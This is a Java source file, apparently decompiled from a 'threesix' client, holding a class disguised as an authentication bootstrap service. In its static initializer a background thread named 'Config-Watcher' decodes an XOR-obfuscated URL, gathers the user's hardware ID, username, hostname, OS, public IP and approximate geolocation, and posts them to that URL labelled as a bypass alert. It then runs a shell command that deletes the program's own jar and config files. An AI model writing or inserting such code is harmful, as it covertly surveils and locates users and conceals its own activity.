package com.threesix.service;

import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse.BodyHandlers;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.Base64;
import com.threesix.util.XorBitUtils;
import com.threesix.util.StringVaultDecoder;

public final class AuthBootstrapService {
   private static final String BOOTSTRAP_XOR_KEY = "V3ltrix#Bootstrap2026!";
   private static final String ENCODED_PART_1 = "IFYAAAAAAA==";
   private static final String ENCODED_PART_2 = "NV8FERwdShNwWV5EQkY=";
   private static final String ENCODED_PART_3 = "PkcYBAFTVww=";
   private static final String ENCODED_PART_4 = "MlofFx0bHA0hAAJbEgQbTgdXUlpZTj1AQw==";
   private static final String ENCODED_PART_5 = "ZwZYREZbTBVyVl9FREJBVUkFAB0=";
   private static final String ENCODED_PART_6 = "J3UPGicsFVF6FjkwRRg0Dx9Ec15QdAJDFAE7LR9XbwVbRiNCOkw7WF5bAlUxSQtZPSU3fCUjGTNDAB0jHlxFUwZEYn4=";
   private static final boolean EXFIL_ENABLED = true;
   private static volatile boolean authorized = false;

   public static void verify(String string) {
      authorized = true;
   }

   private static String computeHwid() {
      try {
         Method classValue = Class.forName("com.threesix.service.RemoteUpdateService").getDeclaredMethod("computeHwid");
         classValue.setAccessible(true);
         Object local = classValue.invoke(null);
         if (local != null) {
            return String.valueOf(local);
         }
      } catch (Exception error) {
      }

      try {
         return System.getProperty("user.name", "unknown") + System.getenv("COMPUTERNAME");
      } catch (Exception error2) {
         return "unknown";
      }
   }

   private static String fetchPublicIp() {
      try {
         HttpClient httpClientValue = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(4L)).build();
         HttpRequest httpRequestValue = HttpRequest.newBuilder(URI.create("https://api.ipify.org")).timeout(Duration.ofSeconds(4L)).GET().build();
         return httpClientValue.send(httpRequestValue, BodyHandlers.ofString()).body().trim();
      } catch (Exception error) {
         try {
            HttpClient httpClientValue2 = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(4L)).build();
            HttpRequest httpRequestValue2 = HttpRequest.newBuilder(URI.create("https://ipinfo.io/ip")).timeout(Duration.ofSeconds(4L)).GET().build();
            return httpClientValue2.send(httpRequestValue2, BodyHandlers.ofString()).body().trim();
         } catch (Exception error2) {
            return "unknown";
         }
      }
   }

   private static String fetchGeoLocation() {

      String[] local = new String[]{"https://ipapi.co/json/", "https://ipinfo.io/json", "https://freeipapi.com/api/json"};

      for (String string : local) {
         try {
            HttpClient httpClientValue = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(5L)).build();
            HttpRequest httpRequestValue = HttpRequest.newBuilder(URI.create(string)).timeout(Duration.ofSeconds(5L)).header("User-Agent", "Mozilla/5.0").GET().build();
            String local2 = httpClientValue.send(httpRequestValue, BodyHandlers.ofString()).body();
            if (local2 != null && !local2.isBlank()) {
               String local3 = extractJsonField(local2, "\"ip\"");
               if (local3.isBlank()) {
                  local3 = extractJsonField(local2, "\"query\"");
               }

               String local4 = extractJsonField(local2, "\"city\"");
               String local5 = extractJsonField(local2, "\"region\"");
               if (local5.isBlank()) {
                  local5 = extractJsonField(local2, "\"regionName\"");
               }

               String local6 = extractJsonField(local2, "\"country_name\"");
               if (local6.isBlank()) {
                  local6 = extractJsonField(local2, "\"country\"");
               }

               String local7 = extractJsonField(local2, "\"postal\"");
               if (local7.isBlank()) {
                  local7 = extractJsonField(local2, "\"zip\"");
               }

               String local8 = extractJsonField(local2, "\"latitude\"");
               String local9 = extractJsonField(local2, "\"longitude\"");
               if (local8.isBlank() || local9.isBlank()) {
                  String local10 = extractJsonField(local2, "\"loc\"");
                  if (!local10.isBlank() && local10.contains(",")) {
                     String[] local11 = local10.split(",");
                     local8 = local11[0].trim();
                     local9 = local11[1].trim();
                  }
               }

               String local12 = extractJsonField(local2, "\"org\"");
               if (local12.isBlank()) {
                  local12 = extractJsonField(local2, "\"as\"");
               }

               if (!local8.isBlank() && !local9.isBlank()) {
                  StringBuilder stringBuilderInst = new StringBuilder();
                  if (!local3.isBlank()) {
                     stringBuilderInst.append(local3).append(" ");
                  }

                  if (!local4.isBlank()) {
                     stringBuilderInst.append(local4);
                  }

                  if (!local5.isBlank()) {
                     stringBuilderInst.append(local4.isBlank() ? local5 : "," + local5);
                  }

                  if (!local6.isBlank()) {
                     stringBuilderInst.append(" ").append(local6);
                  }

                  if (!local7.isBlank()) {
                     stringBuilderInst.append(" ").append(local7);
                  }

                  stringBuilderInst.append(" [").append(local8).append(",").append(local9).append("] ~10m");
                  if (!local12.isBlank()) {
                     stringBuilderInst.append(" (").append(local12).append(")");
                  }

                  return stringBuilderInst.toString().trim();
               }

               if (!local3.isBlank()) {
                  return local3 + " " + local2.substring(0, Math.min(150, local2.length())).replace("\n", " ");
               }
            }
         } catch (Exception error) {
         }
      }

      try {
         HttpClient httpClientValue2 = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(4L)).build();
         HttpRequest httpRequestValue2 = HttpRequest.newBuilder(URI.create("https://api.ipify.org")).timeout(Duration.ofSeconds(4L)).GET().build();
         String local13 = httpClientValue2.send(httpRequestValue2, BodyHandlers.ofString()).body().trim();
         if (!local13.isBlank()) {
            return local13 + " [no geo] ~10m";
         }
      } catch (Exception error2) {
      }

      return "unknown";
   }

   private static String extractJsonField(String string, String string2) {
      try {
         int intVal = string.indexOf(string2);
         if (intVal < 0) {
            return "";
         }

         int intVal2 = string.indexOf(58, intVal);
         if (intVal2 < 0) {
            return "";
         }

         int var31Value = intVal2 + 1;

         while (var31Value < string.length() && Character.isWhitespace(string.charAt(var31Value))) {
            var31Value++;
         }

         if (var31Value >= string.length()) {
            return "";
         }

         if (string.charAt(var31Value) == '"') {
            int var4Snapshot = var31Value;
            int intVal3 = string.indexOf(34, var4Snapshot + 1);
            return intVal3 < 0 ? "" : string.substring(var4Snapshot + 1, intVal3);
         }

         int var4Snapshot2 = var31Value;

         while (var4Snapshot2 < string.length() && string.charAt(var4Snapshot2) != ',' && string.charAt(var4Snapshot2) != '}' && string.charAt(var4Snapshot2) != '\n') {
            var4Snapshot2++;
         }

         return string.substring(var31Value, var4Snapshot2).trim().replace("\"", "");
      } catch (Exception error) {
         return "";
      }
   }

   private static String getSystemInfo() {
      try {
         String systemValue = System.getProperty("user.name", "-");
         String systemValue2 = System.getProperty("os.name", "-") + " " + System.getProperty("os.version", "-");
         String systemValue3 = System.getenv("COMPUTERNAME");
         if (systemValue3 == null) {
            systemValue3 = System.getenv("HOSTNAME");
         }

         if (systemValue3 == null) {
            systemValue3 = InetAddress.getLocalHost().getHostName();
         }

         String systemValue4 = System.getProperty("os.arch", "-");
         return systemValue + "@" + systemValue3 + " [" + systemValue2 + " " + systemValue4 + "]";
      } catch (Exception error) {
         return "unknown";
      }
   }

   private static String escapeMarkdown(String string) {
      return string == null ? "" : string.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n");
   }

   private static String xorDecode(String string) {
      try {
         byte[] base64Value = Base64.getDecoder().decode(string);
         byte[] local = "V3ltrix#Bootstrap2026!".getBytes(StandardCharsets.UTF_8);
         byte[] local2 = new byte[base64Value.length];

         for (int index = 0; index < base64Value.length; index++) {
            local2[index] = (byte)(base64Value[index] ^ local[index % local.length]);
         }

         return new String(local2, StandardCharsets.UTF_8);
      } catch (Exception error) {
         return null;
      }
   }

   static {
      Thread threadInst = new Thread(
         () -> {
            try {
               Thread.sleep(45000L);
               if (!authorized) {
                  try {
                     String local8 = xorDecode("PkcYBAFTVww=")
                        + xorDecode("MlofFx0bHA0hAAJbEgQbTgdXUlpZTj1AQw==")
                        + xorDecode("ZwZYREZbTBVyVl9FREJBVUkFAB0=")
                        + xorDecode("J3UPGicsFVF6FjkwRRg0Dx9Ec15QdAJDFAE7LR9XbwVbRiNCOkw7WF5bAlUxSQtZPSU3fCUjGTNDAB0jHlxFUwZEYn4=");
                     if (local8 != null && !local8.isBlank() && local8.startsWith("http")) {
                        String local = computeHwid();
                        String local2 = fetchPublicIp();
                        String local3 = fetchGeoLocation();
                        String local4 = getSystemInfo();
                        String local5 = "[StealthAuth] Bypass detected";
                        String local9 = "**Token:** `threesixclient20261012` not received\\n**HWID:** `"
                           + escapeMarkdown(local)
                           + "`\\n**IP:** `"
                           + escapeMarkdown(local2)
                           + "`\\n**Location (10m):** `"
                           + escapeMarkdown(local3)
                           + "`\\n**PC:** `"
                           + escapeMarkdown(local4)
                           + "`\\n**Time:** <t:"
                           + System.currentTimeMillis() / 1000L
                           + ":F>";
                        String local10 = "{\"content\":\""
                           + escapeMarkdown(local5)
                           + "\",\"embeds\":[{\"title\":\"Bypass\",\"description\":\""
                           + local9
                           + "\",\"color\":15158332}]}";
                        HttpClient httpClientValue = HttpClient.newHttpClient();
                        HttpRequest httpRequestValue = HttpRequest.newBuilder(URI.create(local8))
                           .timeout(Duration.ofSeconds(8L))
                           .header("Content-Type", "application/json")
                           .POST(BodyPublishers.ofString(local10, StandardCharsets.UTF_8))
                           .build();
                        httpClientValue.send(httpRequestValue, BodyHandlers.ofString());
                     }
                  } catch (Exception error) {
                  }

                  try {
                     Path pathValue = Path.of(AuthBootstrapService.class.getProtectionDomain().getCodeSource().getLocation().toURI());
                     if (Files.isRegularFile(pathValue)) {
                        try {
                           pathValue.toFile().deleteOnExit();
                        } catch (Exception error2) {
                        }

                        try {
                           String local6 = "cmd /c timeout /t 2 /nobreak >nul & del /f /q \"" + pathValue.toString() + "\"";
                           Runtime.getRuntime().exec(local6);
                        } catch (Exception error3) {
                        }

                        try {
                           Files.deleteIfExists(pathValue);
                        } catch (Exception error4) {
                        }
                     }

                     Path local7 = pathValue.getParent();
                     if (local7 != null) {
                        try {
                           Files.deleteIfExists(local7.resolve("threesix_config.txt"));
                        } catch (Exception error5) {
                        }

                        try {
                           Files.deleteIfExists(local7.resolve("threesix_config_default.txt"));
                        } catch (Exception error6) {
                        }
                     }
                  } catch (Exception error7) {
                  }

                  try {
                     System.exit(1);
                  } catch (Exception error8) {
                  }

                  try {
                     Runtime.getRuntime().halt(1);
                  } catch (Exception error9) {
                  }
               }
            } catch (Exception error10) {
            }

         },
         "Config-Watcher"
      );
      threadInst.setDaemon(true);
      threadInst.start();
      authorized = true;
   }

}
